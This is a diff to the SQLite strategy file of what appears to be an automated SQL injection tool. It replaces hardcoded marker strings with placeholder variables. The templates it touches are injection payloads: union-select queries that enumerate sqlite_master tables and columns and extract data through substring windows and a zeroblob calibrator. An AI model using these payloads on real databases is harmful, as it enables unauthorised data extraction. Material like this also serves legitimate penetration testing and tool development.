@@ -14,11 +14,11 @@ select
         <schema>
             <database>
 select 
-    '%04'
+    '${ENCLOSE_VALUE_SQL}'
     ||r
-    ||'%05'
+    ||'${SEPARATOR_QTE_SQL}'
     ||q
-    ||'%04${TRAIL_SQL}'
+    ||'${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from (
     select 
         'sqlite_master'r, 
@@ -30,9 +30,9 @@ from (
             </database>
             <table>
 select group_concat(
-    '%04'
+    '${ENCLOSE_VALUE_SQL}'
     ||name
-    ||'%050%04','${SEPARATOR_CELL_SQL}'
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}','${SEPARATOR_CELL_SQL}'
 )||'${TRAIL_SQL}'
 from (
     select * 
@@ -55,9 +55,9 @@ and type='table'
                 <query>
 select ifnull(
     group_concat(
-        '%04'
+        '${ENCLOSE_VALUE_SQL}'
         ||r
-        ||'%050%04',
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
         '${SEPARATOR_CELL_SQL}'
     ),
 '')||'${TRAIL_SQL}'
@@ -76,15 +76,15 @@ from (
     </resource>
     <strategy>
         <configuration>
-            <slidingWindow>(select'SQLi'||substr((${INJECTION}),${INDEX},65536))</slidingWindow>
+            <slidingWindow>(select'${LEAD}'||substr((${INJECTION}),${INDEX},65536))</slidingWindow>
             <limit> limit 65536 offset ${LIMIT}</limit>
             <failsafe>1337${INDICE}7330%2b1</failsafe>
-            <calibrator>replace(substr(quote(zeroblob((65536%2B1)/2)),3,65536),'0','%23')</calibrator>
+            <calibrator>replace(substr(quote(zeroblob((65536%2B1)/2)),3,65536),'0','${CALIBRATOR_SQL}')</calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
             <indices> union select ${INDICES}</indices>
-            <capacity>(select'SQLi${INDICE}'||${CALIBRATOR}||'iLQS')</capacity>
+            <capacity>(select'${LEAD}${INDICE}'||${CALIBRATOR})</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
